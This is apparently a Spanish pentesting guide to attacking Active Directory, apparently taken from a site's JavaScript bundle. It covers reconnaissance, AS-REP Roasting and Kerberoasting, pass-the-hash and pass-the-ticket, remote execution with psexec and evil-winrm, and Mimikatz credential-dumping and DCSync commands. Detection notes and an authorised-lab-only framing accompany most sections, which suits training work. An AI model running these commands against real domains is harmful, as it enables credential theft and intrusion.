Esta sección cubre Active Directory desde el reconocimiento inicial hasta movimiento lateral y persistencia. Se recomienda seguir el orden: primero [Metodología](/pentesting/active-directory/metodologia) para el proceso de reconocimiento y el árbol de decisión inicial, después [Enumeración](/pentesting/active-directory/enumeracion) para la fase de recolección de usuarios y equipos. Para consulta rápida de comandos y flags, usar [Reference](/pentesting/active-directory/reference).
`,kr=`Kerberos es el protocolo de autenticación nativo de Active Directory, y dos de sus debilidades de diseño — la ausencia opcional de pre-autenticación y la posibilidad de solicitar tickets de servicio sin restricciones — dan lugar a dos de las técnicas de obtención de credenciales más usadas en cualquier pentest de AD: AS-REP Roasting y Kerberoasting. Ambas comparten el mismo patrón: obtener un material cifrado con la clave derivada de una contraseña y crackearlo offline, sin generar intentos de login que puedan bloquear cuentas.

## Kerberos en 2 minutos

Kerberos autentica mediante un sistema de tickets emitidos por el Key Distribution Center (KDC, que en AD corre en cada controlador de dominio). El flujo básico:

\`\`\`text
Cliente                              KDC (AS / TGS)
   |                                        |
   |--- AS-REQ (usuario + timestamp) ------->|   (normalmente cifrado con la clave del usuario = pre-auth)
   |<-- AS-REP (TGT + session key) ----------|   cifrado con la clave derivada de la contraseña del usuario
   |                                        |
   |--- TGS-REQ (TGT + SPN deseado) -------->|
   |<-- TGS-REP (TGS para ese servicio) -----|   cifrado con el hash de la cuenta de SERVICIO
   |                                        |
   |--- AP-REQ (TGS) ----------------------->|  al servicio final, que descifra con su propio hash
\`\`\`

- **AS** (Authentication Service): emite el **TGT** (Ticket Granting Ticket) tras validar la identidad del usuario.
- **TGS** (Ticket Granting Service): emite tickets de servicio (**TGS**) a partir de un TGT válido, sin volver a pedir la contraseña.
- **krbtgt**: la cuenta de servicio especial cuyo hash cifra todos los TGT del dominio — comprometerla es equivalente a tener persistencia total (ver [Golden Ticket](/pentesting/active-directory/tickets)).

El paso de **pre-autenticación** (incluido por defecto desde Windows 2000) exige que el cliente cifre un timestamp con su propia clave antes de recibir el AS-REP, precisamente para evitar el ataque que se describe a continuación.

***

## AS-REP Roasting

**¿Qué es?** Un ataque contra cuentas de usuario configuradas con el flag \`DONT_REQ_PREAUTH\` (valor de UserAccountControl \`4194304\`), es decir, cuentas que **no requieren pre-autenticación Kerberos**. Esta configuración a veces aparece por compatibilidad con sistemas antiguos o por error de administración.

**¿Por qué funciona?** Sin pre-autenticación, cualquiera puede enviar un AS-REQ a nombre de esa cuenta sin demostrar que conoce la contraseña. El KDC responde igualmente con un AS-REP, y parte de ese AS-REP va cifrada con una clave derivada directamente de la contraseña del usuario. Quien captura ese AS-REP puede intentar crackear la contraseña offline, sin haber presentado ninguna credencial y sin arriesgar ningún bloqueo de cuenta.

**Requisitos.** Ninguna credencial es estrictamente necesaria si ya se dispone de una lista de nombres de usuario válidos; con credenciales de dominio, la enumeración de cuentas vulnerables es más fiable (LDAP).

**Desde Linux (Impacket)**

\`\`\`bash
# Sin credenciales: requiere una lista de usuarios válidos
GetNPUsers.py <dominio>/ -no-pass -usersfile users.txt -format hashcat -dc-ip <dc-ip>

# Con credenciales: enumera automáticamente las cuentas con DONT_REQ_PREAUTH vía LDAP
GetNPUsers.py <dominio>/<usuario>:<password> -request -format hashcat -dc-ip <dc-ip>
\`\`\`

**Desde Windows (Rubeus)**

\`\`\`text
Rubeus.exe asreproast
\`\`\`

**Resultado esperado**

\`\`\`text
$krb5asrep$23$svc_legacy@<DOMINIO>:a1b2c3...d4e5f6
\`\`\`

**Interpretación.** El hash \`$krb5asrep$\` es el material cifrado del AS-REP para esa cuenta. No es la contraseña — es lo que hay que crackear offline.

**Cracking**

\`\`\`bash
hashcat -m 18200 hashes.txt wordlist.txt
\`\`\`

**Siguiente paso.** Si el cracking tiene éxito, se dispone de una credencial válida de dominio: continuar con la enumeración de privilegios de esa cuenta — ver [BloodHound](/pentesting/active-directory/bloodhound) — o reutilizarla, ver [Password Attacks](/pentesting/active-directory/password-attacks).

**Detección/Defensa.** Un SIEM puede detectar AS-REQ repetidos sin pre-auth hacia la misma cuenta; la defensa estructural es simplemente no desactivar la pre-autenticación salvo necesidad explícita y documentada.

**Si falla…**

| Error | Causa probable |
|---|---|
| \`KDC_ERR_C_PRINCIPAL_UNKNOWN\` | El nombre de usuario no existe en el dominio |
| \`KRB_AP_ERR_SKEW\` / desync horario | Reloj del atacante desincronizado con el DC; sincronizar con \`ntpdate <dc-ip>\` |
| Lista vacía de resultados | Ninguna cuenta del dominio tiene \`DONT_REQ_PREAUTH\` activo |

***

## Kerberoasting

**¿Qué es?** Un ataque contra cuentas de servicio que tienen un **SPN** (Service Principal Name) asociado — típicamente cuentas usadas para ejecutar servicios como SQL Server, IIS con autenticación integrada, o aplicaciones personalizadas.

**¿Por qué funciona?** Cualquier usuario autenticado del dominio puede solicitar un TGS para cualquier servicio con SPN registrado, sin restricciones adicionales. Ese TGS viaja cifrado con el **hash de la cuenta de servicio**, no con la clave del solicitante. Si la cuenta de servicio tiene una contraseña débil, el TGS puede crackearse offline tras capturarlo — de nuevo, sin generar ningún intento de autenticación fallido contra la cuenta objetivo.

**Requisitos.** Credenciales válidas de cualquier usuario del dominio (no se necesitan privilegios elevados).

**Desde Linux (Impacket)**

\`\`\`bash
# Enumerar cuentas con SPN
GetUserSPNs.py <dominio>/<usuario>:<password> -dc-ip <dc-ip>

# Solicitar y volcar los TGS en formato hashcat
GetUserSPNs.py <dominio>/<usuario>:<password> -dc-ip <dc-ip> -request -outputfile hashes.txt
\`\`\`

**Desde Windows (Rubeus)**

\`\`\`text
Rubeus.exe kerberoast
\`\`\`

**Resultado esperado**

\`\`\`text
$krb5tgs$23$*sqlservice$<DOMINIO>$<DOMINIO>/sqlservice*$a1b2c3...
\`\`\`

**Interpretación.** El prefijo \`$krb5tgs$\` identifica un hash Kerberoast (TGS-REP). Cada línea corresponde a una cuenta de servicio distinta.

**Cracking**

\`\`\`bash
hashcat -m 13100 hashes.txt wordlist.txt
\`\`\`

> **Importante.** Si el cracking revela, por ejemplo, \`sqlservice:Password123!\`, eso **no** significa que esa cuenta sea Domain Admin. El siguiente paso obligatorio es evaluar sus privilegios reales: grupos a los que pertenece, sesiones activas en otros equipos, en qué máquinas es administrador local, qué otros SPN controla, y qué camino de ataque (attack path) habilita. Ver [BloodHound](/pentesting/active-directory/bloodhound).

**Siguiente paso.** Cracking exitoso → BloodHound para evaluar privilegios. Sin resultado de cracking → considerar password spraying con esa misma cuenta de servicio como objetivo, ver [Password Attacks](/pentesting/active-directory/password-attacks).

**Detección/Defensa.** Picos de solicitudes TGS-REQ para múltiples SPN distintos desde un mismo usuario en poco tiempo son una señal clásica. La mitigación estructural es usar contraseñas largas y aleatorias (o gMSA) para cuentas de servicio.

**Si falla…**

| Error | Causa probable |
|---|---|
| \`KDC_ERR_S_PRINCIPAL_UNKNOWN\` | El SPN indicado no existe o está mal escrito |
| \`KRB_AP_ERR_SKEW\` | Desincronización horaria con el DC |
| Sin SPN listados | El dominio no tiene cuentas de servicio con SPN registrado (poco común) |
`,Ar=`Una vez obtenidas credenciales o material Kerberos de una cuenta con privilegios en algún host, el siguiente paso es moverse lateralmente por el dominio. Esta página cubre las técnicas de autenticación (Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash) y los métodos de ejecución remota que se apoyan en ellas.

## Pass-the-Hash (PtH)

**¿Qué es?** Uso del NT hash de una cuenta para autenticarse por NTLM sin necesidad de conocer la contraseña en claro.

\`\`\`text
NT hash
    ↓
Autenticación NTLM sin contraseña en claro
    ↓
Acceso al servicio/host objetivo
\`\`\`

El origen del hash suele ser un volcado de SAM/LSASS o un DCSync (ver [credential-dumping](/pentesting/active-directory/credential-dumping)).

**Desde Linux**

\`\`\`bash
nxc smb <target> -u <usuario> -H <nthash>
evil-winrm -i <target> -u <usuario> -H <nthash>
psexec.py <dominio>/<usuario>@<target> -hashes :<nthash>
wmiexec.py <dominio>/<usuario>@<target> -hashes :<nthash>
smbexec.py <dominio>/<usuario>@<target> -hashes :<nthash>
\`\`\`

**Desde Windows**

\`\`\`powershell
# Mimikatz
sekurlsa::pth /user:<usuario> /domain:<dominio> /ntlm:<nthash> /run:cmd.exe
\`\`\`

**Resultado esperado**: una shell o acceso SMB/WinRM sobre \`<target>\` autenticado como \`<usuario>\`, sin haber introducido ninguna contraseña en claro.

**Siguiente paso**: si la cuenta tiene privilegios locales en más hosts, repetir contra ellos; si no, buscar rutas de escalada adicionales con [bloodhound](/pentesting/active-directory/bloodhound).

***

## Pass-the-Ticket (PtT)

**¿Qué es?** Uso de un ticket Kerberos (TGT o TGS) ya obtenido, en formato \`.kirbi\` (Windows) o \`.ccache\` (Linux), inyectándolo en la sesión actual para autenticarse sin volver a pedir credenciales.

**Desde Windows (Mimikatz / Rubeus)**

\`\`\`powershell
# Exportar tickets de la sesión actual
sekurlsa::tickets /export

# Inyectar un ticket exportado
kerberos::ptt <ticket.kirbi>

# Rubeus
Rubeus.exe ptt /ticket:<ticket.kirbi>
\`\`\`

**Desde Linux**

\`\`\`bash
export KRB5CCNAME=ticket.ccache
\`\`\`

Convertir entre formatos cuando sea necesario:

\`\`\`bash
ticketConverter.py ticket.kirbi ticket.ccache
\`\`\`

**Verificación**

\`\`\`bash
klist
\`\`\`

**Resultado esperado**: el ticket aparece listado por \`klist\` y las siguientes conexiones Kerberos (SMB, WinRM, etc.) usan esa identidad sin pedir contraseña.

***

## Overpass-the-Hash (Pass-the-Key)

**¿Qué es?** Uso del NT hash de una cuenta para solicitar un TGT Kerberos legítimo (en lugar de autenticar por NTLM directamente), que después se usa como cualquier otro TGT.

\`\`\`text
NT hash
    ↓
Solicitud de TGT vía Kerberos (AS-REQ) usando el hash como clave
    ↓
TGT válido
    ↓
Autenticación Kerberos normal
\`\`\`

| Técnica | Qué se usa | Resultado |
|---|---|---|
| Pass-the-Hash | NT hash | Autenticación NTLM directa |
| Overpass-the-Hash | NT hash | TGT Kerberos |
| Pass-the-Ticket | Ticket ya existente | Autenticación Kerberos directa |

**Desde Windows**

\`\`\`powershell
# Rubeus
Rubeus.exe asktgt /user:<usuario> /domain:<dominio> /rc4:<nthash> /ptt

# Mimikatz (pide el TGT e inyecta directamente)
sekurlsa::pth /user:<usuario> /domain:<dominio> /ntlm:<nthash> /run:cmd.exe
\`\`\`

**Desde Linux**

\`\`\`bash
getTGT.py <dominio>/<usuario> -hashes :<nthash>
export KRB5CCNAME=<usuario>.ccache
\`\`\`

**Interpretación**: se obtiene un TGT Kerberos legítimo sin conocer la contraseña en claro, lo que permite usar servicios que solo aceptan Kerberos (algunos entornos con NTLM deshabilitado).

***

## Métodos de ejecución remota

> **Nota de compatibilidad.** Todos los métodos siguientes requieren credenciales o material Kerberos/NTLM válido para una cuenta con privilegios suficientes en el host objetivo. Usar solo en laboratorio o con autorización explícita.

| Método | Puerto(s) | Requisitos | Herramienta |
|---|---|---|---|
| PsExec | 445 | Admin local, crea un servicio temporal | \`psexec.py\` |
| WMI | 135 + 445 | Admin local, usa DCOM/WMI | \`wmiexec.py\` |
| WinRM | 5985 / 5986 | Usuario en grupo \`Remote Management Users\` o admin local | \`evil-winrm\` |
| DCOM | 135 | Admin local, usa objetos DCOM específicos | \`dcomexec.py\` |
| RDP | 3389 | Sesión interactiva permitida, credenciales válidas | \`xfreerdp\` |
| Token Impersonation | local (post-explotación) | Ejecución de código ya establecida en el host | \`incognito\` (Meterpreter) / \`Invoke-TokenManipulation\` |

### PsExec

**Requisitos**: credenciales o hash válidos de una cuenta con privilegios de administrador local. **Puertos**: 445 (SMB), más un puerto dinámico para el pipe del servicio. **Comando**:

\`\`\`bash
psexec.py <dominio>/<usuario>@<target> -hashes :<nthash>
\`\`\`

**Resultado**: shell SYSTEM remota. **Limitaciones**: crea y elimina un servicio temporal en el objetivo, lo que genera eventos de creación de servicio (Event ID 7045) fácilmente detectables. **Detección**: logs de creación/eliminación de servicio en el Security/System log del objetivo. **Siguiente paso**: volcar credenciales locales (ver [credential-dumping](/pentesting/active-directory/credential-dumping)) o continuar el movimiento lateral.

### WMI

**Requisitos**: admin local. **Puertos**: 135 (RPC endpoint mapper) + 445, más puertos dinámicos DCOM. **Comando**:

\`\`\`bash
wmiexec.py <dominio>/<usuario>@<target> -hashes :<nthash>
\`\`\`

**Resultado**: pseudo-shell semi-interactiva vía WMI. **Limitaciones**: no deja un proceso de servicio persistente, pero genera eventos de ejecución de proceso (\`Win32_Process.Create\`) auditables. **Detección**: Event ID 4688 con línea de comandos inusual, logs de WMI-Activity.

### WinRM

**Requisitos**: la cuenta debe pertenecer al grupo \`Remote Management Users\` o ser administrador local; WinRM debe estar habilitado en el objetivo. **Puertos**: 5985 (HTTP) / 5986 (HTTPS). **Comando**:

\`\`\`bash
evil-winrm -i <target> -u <usuario> -H <nthash>
\`\`\`

**Resultado**: shell PowerShell remota interactiva. **Limitaciones**: requiere que el servicio WinRM esté activo, lo cual no siempre es el caso por defecto en estaciones de trabajo. **Detección**: logs de PowerShell remoting (Event ID 4103/4104), conexiones entrantes al puerto 5985/5986.

### DCOM

**Requisitos**: admin local. **Puertos**: 135 + puertos dinámicos DCOM. **Comando**:

\`\`\`bash
dcomexec.py <dominio>/<usuario>@<target> -hashes :<nthash>
\`\`\`

**Resultado**: ejecución de comandos vía objetos DCOM (por ejemplo, \`MMC20.Application\`). **Limitaciones**: menos común y más frágil que WMI/PsExec; puede no funcionar igual en todas las versiones de Windows. **Detección**: eventos de activación DCOM, logs de proceso.

### RDP

**Requisitos**: el usuario debe tener permiso de inicio de sesión RDP en el objetivo (directo o vía \`CanRDP\` en BloodHound, ver [bloodhound](/pentesting/active-directory/bloodhound)); credenciales en claro o hash si el objetivo lo permite. **Puertos**: 3389. **Comando**:

\`\`\`bash
xfreerdp /u:<usuario> /p:'<password>' /v:<target>
\`\`\`

**Resultado**: sesión gráfica interactiva. **Limitaciones**: requiere contraseña en claro en la mayoría de configuraciones (RDP no suele aceptar PtH directamente salvo *Restricted Admin Mode*). **Detección**: Event ID 4624 (Logon Type 10), logs de sesión RDP.

### Token Impersonation

**Requisitos**: ejecución de código ya establecida en el host objetivo (no es un método de acceso inicial, sino de escalada/pivote post-explotación). **Puertos**: ninguno, es local al proceso. **Comando**:

\`\`\`text
# Meterpreter
use incognito
list_tokens -u
impersonate_token <dominio>\\\\<usuario>
\`\`\`

\`\`\`powershell
Invoke-TokenManipulation -ImpersonateUser -Username "<dominio>\\<usuario>"
\`\`\`

**Resultado**: el proceso actual actúa con el token de otro usuario conectado en el mismo host. **Limitaciones**: depende de que haya un token útil disponible en el host (sesiones activas o cacheadas de otra cuenta). **Detección**: difícil de detectar directamente; correlacionar con el uso posterior de los privilegios obtenidos.

**Siguiente paso general**: tras obtener ejecución en el objetivo por cualquiera de estos métodos, repetir el ciclo de [credential-dumping](/pentesting/active-directory/credential-dumping) y continuar el pivote, o forjar/reutilizar tickets Kerberos (ver [tickets](/pentesting/active-directory/tickets)).
`,jr=`LDAP es el protocolo con el que Active Directory expone su directorio para consultas: usuarios, grupos, equipos, políticas y sus atributos. Dominar \`ldapsearch\` y los filtros habituales permite extraer, sin herramientas gráficas, exactamente la información necesaria para decidir el siguiente ataque.

## Conceptos

| Término | Qué es |
|---|---|
| LDAP | Protocolo de acceso al directorio sobre el puerto 389 (texto claro/STARTTLS). |
| LDAPS | LDAP sobre TLS, puerto 636 (y 3268/3269 para Global Catalog). |
| Base DN | Punto de partida de una búsqueda dentro del árbol del directorio, p. ej. \`DC=dominio,DC=local\`. |
| DN (Distinguished Name) | Ruta completa y única de un objeto dentro del árbol LDAP. |
| CN (Common Name) | Nombre común de un objeto; suele ser el primer componente de su DN. |
| OU (Organizational Unit) | Contenedor usado para organizar objetos dentro del dominio. |
| ObjectClass | Atributo que define el tipo de objeto (user, group, computer, etc.). |
| Attributes | Pares atributo-valor que describen un objeto (sAMAccountName, memberOf, userAccountControl...). |

***

## ldapsearch

\`\`\`bash
ldapsearch -x -H ldap://<dc-ip> -D "<usuario>@<dominio>" -w '<password>' -b "DC=<dominio>,DC=local" "(objectClass=user)"
\`\`\`

- \`-x\`: usa autenticación simple en lugar de SASL.
- \`-H\`: especifica el host y esquema (\`ldap://\` o \`ldaps://\`) del servidor LDAP.
- \`-D\`: el DN o UPN (\`usuario@dominio\`) con el que autenticarse.
- \`-w\`: la contraseña, en texto claro en la línea de comandos (usar \`-W\` para que la pida interactivamente si se prefiere no exponerla).
- \`-b\`: el Base DN desde el que empezar la búsqueda.
- El último argumento es el filtro de búsqueda LDAP, en este ejemplo todos los objetos de clase \`user\`.

### Filtros útiles

| Filtro | Qué devuelve | Lleva a |
|---|---|---|
| \`(objectClass=user)\` | Todos los objetos de tipo usuario. | Punto de partida para enumeración general. |
| \`(!(userAccountControl:1.2.840.113556.1.4.803:=2))\` | Usuarios habilitados (excluye el bit de cuenta deshabilitada). | Filtrar objetivos activos antes de password spraying. |
| \`(adminCount=1)\` | Cuentas marcadas como administrativas (protegidas por AdminSDHolder). | Identificar cuentas privilegiadas a priorizar/evitar según el caso. |
| \`(servicePrincipalName=*)\` | Cuentas con un SPN asociado. | Kerberoasting: ver [Kerberos](/pentesting/active-directory/kerberos). |
| \`(userAccountControl:1.2.840.113556.1.4.803:=4194304)\` | Cuentas con \`DONT_REQ_PREAUTH\` activado. | AS-REP Roasting: ver [Kerberos](/pentesting/active-directory/kerberos). |

> **Nota de compatibilidad.** Que una cuenta tenga un SPN no garantiza que su hash Kerberoasteado sea crackeable; depende de la fortaleza de la contraseña de esa cuenta de servicio.

***

## ldapdomaindump

\`\`\`bash
ldapdomaindump -u '<dominio>\\<usuario>' -p '<password>' <dc-ip>
\`\`\`

\`ldapdomaindump\` vuelca el contenido del directorio en una serie de ficheros HTML/JSON navegables, pensados para revisión rápida sin tener que construir filtros LDAP manualmente:

- \`domain_users.html\`: listado de usuarios con sus atributos principales; buscar cuentas con contraseña que no expira, cuentas deshabilitadas o descripciones con información sensible.
- \`domain_computers.html\`: listado de equipos del dominio, incluyendo sistema operativo; útil para localizar Domain Controllers y servidores desactualizados.
- \`domain_groups.html\`: grupos y su membresía; revisar especialmente Domain Admins, Enterprise Admins y grupos con delegación.
- \`domain_policy.html\`: política de contraseñas y de bloqueo de cuentas del dominio, clave para calibrar cualquier ataque de password spraying sin bloquear cuentas.

***

## PowerView (Windows)

\`\`\`powershell
Import-Module .\\PowerView.ps1
\`\`\`

| Comando | ¿Qué hace? | ¿Qué devuelve? | ¿Qué buscar? | Siguiente paso |
|---|---|---|---|---|
| \`Get-Domain\` | Obtiene información básica del dominio actual. | Nombre de dominio, DCs, forest. | Confirmar contexto del dominio. | Enumerar usuarios/equipos. |
| \`Get-DomainController\` | Lista los Domain Controllers del dominio. | Hostname, IP, OS de cada DC. | Más de un DC, versión de OS desactualizada. | Priorizar DC objetivo. |
| \`Get-DomainUser\` | Enumera usuarios del dominio y sus atributos. | sAMAccountName, memberOf, descripción, SPN. | Descripciones con contraseñas, cuentas con SPN. | Password attacks / Kerberoasting. |
| \`Get-DomainComputer\` | Enumera equipos del dominio. | Hostname, OS, delegación configurada. | Equipos con \`unconstrained delegation\`. | Ver [Delegation](/pentesting/active-directory/delegation). |
| \`Get-DomainGroup\` | Enumera grupos del dominio. | Nombre, descripción, SID. | Grupos no estándar con nombres sugerentes. | Revisar membresía con \`Get-DomainGroupMember\`. |
| \`Get-DomainGroupMember -Identity "Domain Admins"\` | Lista miembros de un grupo concreto. | Usuarios/equipos miembros del grupo. | Cuentas de servicio o usuarios inesperados en el grupo. | Priorizar esas cuentas como objetivo. |

> **Nota de compatibilidad.** PowerView requiere ejecutarse desde una sesión Windows (nativa o vía proxy/relay); no tiene equivalente directo en Linux más allá de las herramientas LDAP/Impacket ya vistas.

***

Los datos recolectados por LDAP, \`ldapdomaindump\` o PowerView son exactamente el tipo de información que [BloodHound](/pentesting/active-directory/bloodhound) consume para construir el grafo de rutas de ataque. Las cuentas con SPN o \`DONT_REQ_PREAUTH\` conectan directamente con [Kerberos](/pentesting/active-directory/kerberos), y los permisos encontrados sobre objetos del directorio con [ACL/ACE](/pentesting/active-directory/acl-ace).
`,Mr=`La metodología frente a un entorno Active Directory sigue un ciclo iterativo de enumeración y explotación: cada nuevo dato (un usuario, un equipo, una credencial) reabre la fase de enumeración antes de intentar el siguiente salto. Esta página cubre la filosofía general, los puertos relevantes y el reconocimiento inicial para identificar el Domain Controller y el dominio.

## Filosofía

\`\`\`text
Enumerar
  ↓
Identificar
  ↓
Formular hipótesis
  ↓
Explotar
  ↓
Obtener acceso
  ↓
Escalar
  ↓
Moverse lateralmente
  ↓
Domain Dominance
  ↓
Documentar / Cleanup
\`\`\`

Cada vuelta del ciclo añade información nueva (credenciales, pertenencia a grupos, acceso a un equipo) que obliga a repetir la enumeración con ese nuevo contexto. No es un proceso lineal de una sola pasada.

> **Solo laboratorio / entorno autorizado.** Todos los comandos de esta sección asumen un entorno de laboratorio (OSCP, CTF) o un pentest interno con autorización explícita por escrito.

***

## Puertos de Active Directory

| Puerto | Protocolo | Servicio | Importancia |
|---|---|---|---|
| 53 | TCP/UDP | DNS | Domain discovery; AD depende de DNS para localizar DCs y servicios. |
| 88 | TCP/UDP | Kerberos | Autenticación principal en AD; indicador fuerte de DC. |
| 135 | TCP | MSRPC | Enumeración de servicios y movimiento lateral (DCOM, WMI). |
| 139 | TCP | SMB/NetBIOS | Legacy; sesiones NetBIOS sobre SMB. |
| 389 | TCP/UDP | LDAP | Consulta del directorio; enumeración de usuarios, grupos, equipos. |
| 445 | TCP | SMB | Enumeración de shares, acceso a archivos, muchos ataques de credential dumping. |
| 464 | TCP/UDP | Kerberos password change | Cambio de contraseña vía Kerberos (kpasswd). |
| 636 | TCP | LDAPS | LDAP sobre TLS. |
| 3268 | TCP | LDAP Global Catalog | Enumeración a nivel de forest completo, no solo del dominio. |
| 3269 | TCP | LDAPS Global Catalog | Global Catalog sobre TLS. |
| 3389 | TCP | RDP | Acceso interactivo; habitual en movimiento lateral. |
| 5985 | TCP | WinRM HTTP | Gestión remota de Windows (PowerShell remoting). |
| 5986 | TCP | WinRM HTTPS | WinRM sobre TLS. |

Ver también el análisis dedicado de [SMB en los puertos 139/445](/pentesting/services/puertos-139-445-smb) para profundizar en ese servicio.

***

## Reconocimiento

\`\`\`text
IP/Network
  ↓
Live Hosts
  ↓
Open Ports
  ↓
Identify DC
  ↓
Identify Domain
  ↓
Identify Hostname
  ↓
Enumerate Users
  ↓
Enumerate Services
\`\`\`

\`\`\`bash
# Descubrir hosts activos en el segmento
nmap -sn 192.168.1.0/24

# Escaneo dirigido a puertos típicos de AD
nmap -p88,389,445,3268,3269,5985 192.168.1.0/24

# Escaneo completo de un objetivo concreto, con detección de versión y scripts por defecto
nmap -sV -sC -p- <target>
\`\`\`

El primer comando identifica qué hosts están vivos sin lanzar escaneo de puertos. El segundo filtra rápidamente qué hosts exponen servicios característicos de AD (88, 389, 445, 3268/3269 sugieren fuertemente un Domain Controller). El tercero, ya sobre un objetivo concreto, da detalle de versiones y banners que ayudan a confirmar el sistema operativo y los servicios expuestos.

> **Nota de compatibilidad.** Tener el puerto 445 abierto no implica que el host sea vulnerable, ni que sea un DC; es solo un indicador que debe confirmarse con enumeración adicional.

***

## Identificar el Domain Controller

Indicadores que, combinados, apuntan a que un host es un Domain Controller:

- Puerto 88 abierto (Kerberos).
- Puerto 389 abierto (LDAP).
- Puerto 445 abierto (SMB).
- Puerto 3268 abierto (LDAP Global Catalog).
- Puerto 3269 abierto (LDAPS Global Catalog).

\`\`\`bash
crackmapexec smb <dc-ip>
\`\`\`

> **Nota.** NetExec (\`nxc\`) es el sucesor moderno de CrackMapExec y mantiene la misma sintaxis: \`nxc smb <dc-ip>\`. CrackMapExec sigue siendo válido y ambos aparecen indistintamente en esta sección.

La salida de este comando sobre el puerto 445 suele revelar: el nombre del dominio, el hostname del equipo, la versión del sistema operativo y si SMB Signing está habilitado. Un dominio encontrado en la salida no confirma por sí solo que ese host sea el DC: hay que cruzarlo con los puertos Kerberos/LDAP/Global Catalog.

***

## Árbol de decisión inicial

\`\`\`text
¿Puerto 88 abierto?
  → Sí: Kerberos disponible, candidato a DC

¿Puerto 389 abierto?
  → Sí: LDAP disponible, enumeración de directorio posible

¿Puerto 445 abierto?
  → Sí: SMB disponible, enumeración de shares/usuarios posible

¿Puerto 3268 abierto?
  → Sí: Global Catalog disponible, enumeración a nivel de forest

¿Tengo credenciales válidas?
  → NO: User Enumeration / AS-REP Roasting / Password Policy
  → SÍ: LDAP / SMB / BloodHound / Kerberoasting / ACL Enumeration
\`\`\`

A partir de aquí, sin credenciales el siguiente paso natural es [Enumeración](/pentesting/active-directory/enumeracion) para identificar usuarios válidos. Con credenciales, las rutas abiertas son [LDAP](/pentesting/active-directory/ldap), el repaso de [SMB y SYSVOL](/pentesting/active-directory/smb-sysvol), [Kerberos](/pentesting/active-directory/kerberos) y [BloodHound](/pentesting/active-directory/bloodhound) para mapear rutas de ataque.
`,Nr=`Mimikatz es una de las implementaciones de *credential access* más conocidas, pero **no es "la" herramienta de credential dumping**: es una de varias formas de ejecutar técnicas (acceso a LSASS, LSA Secrets, DCSync, tickets Kerberos). Esta página la coloca en el flujo real de un pentest/OSCP y resuelve la pregunta práctica que aparece una y otra vez en laboratorios modernos: **¿qué hago cuando Windows Defender o un EDR bloquea Mimikatz?**

La idea rectora, que repetiremos: **objetivo → técnica → herramienta**, nunca al revés.

\`\`\`text
Credential Dumping → Mimikatz → ¿Defender/AV/EDR bloquea?
   → entender qué detecta → validar en laboratorio
   → técnica compatible con el entorno → Credential Dumping
   → Pass the Hash / Pass the Ticket
\`\`\`

> **Solo laboratorio / entorno autorizado.** Todo lo de aquí es para laboratorios, CTFs o sistemas con autorización explícita. Esta página **no es un catálogo de bypasses** contra productos de seguridad reales: su objetivo es entender por qué una herramienta se detecta y cómo **diagnosticarlo** y **elegir otra implementación legítima** de la misma técnica.

> **Información adicional.** El material sobre AV/EDR, AMSI y OPSEC de esta página es **ampliación externa**, no procede del documento de origen de DCSync (que solo mostraba \`privilege::debug\` y \`lsadump::dcsync\`).

***

## Mimikatz: el cambio de mentalidad

Antes de ejecutar nada, separa **qué quieres conseguir** de **con qué**:

| Herramienta | Qué es |
|---|---|
| Mimikatz | Una implementación de varias técnicas de *credential access*. |
| La técnica | Lo que realmente persigues (DCSync, acceso a LSASS, forjar un ticket…). |

Si Mimikatz está bloqueado, el objetivo **no** cambia: cambia la herramienta. Casi todas sus funciones tienen equivalente en Impacket, NetExec o Rubeus (ver [Alternativas](#alternativas-technique-tool)).

***

## Comandos principales (laboratorio)

Resumen operativo; el detalle de cada técnica está en su página.

\`\`\`text
mimikatz # privilege::debug                 # solicita SeDebugPrivilege
mimikatz # sekurlsa::logonpasswords         # credenciales en memoria (LSASS)
mimikatz # sekurlsa::tickets /export        # tickets Kerberos de la sesión
mimikatz # lsadump::sam                      # hashes locales (SAM)
mimikatz # lsadump::secrets                  # LSA Secrets
mimikatz # lsadump::dcsync /user:krbtgt      # DCSync (replicación)
mimikatz # kerberos::ptt ticket.kirbi        # Pass-the-Ticket
mimikatz # kerberos::golden ...              # Golden Ticket
\`\`\`

| Comando | Qué hace | Privilegios | Devuelve | Por qué podría fallar |
|---|---|---|---|---|
| \`privilege::debug\` | Obtiene \`SeDebugPrivilege\` | Admin local | \`Privilege '20' OK\` | Sin admin local → \`ERROR kuhl_m_privilege_simple\` |
| \`sekurlsa::logonpasswords\` | Lee credenciales de LSASS | SYSTEM / SeDebug | Hashes/tickets, a veces claro | Credential Guard, EDR, falta de privilegio |
| \`lsadump::sam\` | Hashes locales | SYSTEM | NT de cuentas locales | Sin SYSTEM |
| \`lsadump::dcsync\` | Replica secretos del DC | Derechos de replicación | Hash del usuario / \`krbtgt\` | Sin replication rights (ver [DCSync](/pentesting/active-directory/dcsync)) |
| \`kerberos::ptt\` | Inyecta un ticket | Usuario | Ticket en sesión | Ticket caducado / clock skew |

Detalle completo: [DCSync](/pentesting/active-directory/dcsync), [Tickets](/pentesting/active-directory/tickets), [Lateral Movement](/pentesting/active-directory/lateral-movement).

***

## Por qué Mimikatz es detectado

La detección no es una sola cosa: hay **capas**, y evitar una no implica evitar las demás.

\`\`\`text
Static Detection    → firma del binario/script en disco
      ↓
Execution Detection → carga/ejecución del proceso
      ↓
Behavior Detection  → acciones sospechosas (p. ej. abrir LSASS)
      ↓
Credential Access   → lectura de material de credenciales
      ↓
EDR Correlation     → telemetría correlacionada entre eventos
\`\`\`

Puntos clave:

- **Firmas**: Mimikatz es una herramienta pública muy firmada; su detección estática es esperable.
- **AMSI**: inspecciona el contenido de scripts/PowerShell en el momento de ejecutarse, incluso en memoria.
- **Acceso a LSASS**: abrir \`lsass.exe\` para leer memoria es un comportamiento muy monitorizado (independiente de la firma).
- **Credential Guard**: cuando está activo, aísla los secretos de LSASS, por lo que \`sekurlsa::logonpasswords\` puede no devolver material aunque Mimikatz se ejecute sin problema.
- **EDR telemetry**: un EDR correlaciona varios eventos (proceso + acceso a LSASS + red) aunque ninguno por separado dispare una firma.

> **"No me detecta el archivo" no significa "no me detectará la ejecución".** La detección por comportamiento y por acceso a credenciales actúa aunque el binario pase el análisis estático.

### AV vs AMSI vs Defender vs EDR vs Credential Guard

| Tecnología | Qué puede detectar/hacer |
|---|---|
| **Antivirus** | Archivos, firmas, heurística estática |
| **AMSI** | Contenido de scripts y PowerShell en ejecución |
| **Windows Defender** | Malware + comportamiento (integra AV + AMSI + algo de comportamiento) |
| **EDR** | Telemetría + comportamiento + **correlación** entre eventos |
| **Credential Guard** | **Protege** credenciales en LSASS (no "detecta": impide la lectura) |

***

## Diagnóstico: ¿qué está fallando realmente?

